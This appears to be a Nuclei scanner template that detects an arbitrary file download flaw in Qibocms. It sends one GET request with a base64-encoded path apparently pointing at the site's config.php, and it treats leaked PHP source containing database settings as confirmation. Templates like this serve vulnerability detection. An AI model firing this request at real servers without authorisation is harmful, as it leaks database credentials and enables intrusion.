id: qibocms-file-download
info:
  name: Qibocms - Arbitrary File Download
  author: theabhinavgaur
  severity: high
  description: Qibocms is vulnerable to arbitrary file download vulnerability.
  classification:
    cwe-id:
      - CWE-200
      - CWE-552
  metadata:
    max-request: 1
    verified: true
  tags: lfr,qibocms,vuln
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - <?php
          - $webdb
      - part: header
        type: word
        words:
          - filename=config
      - status:
          - 200
        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
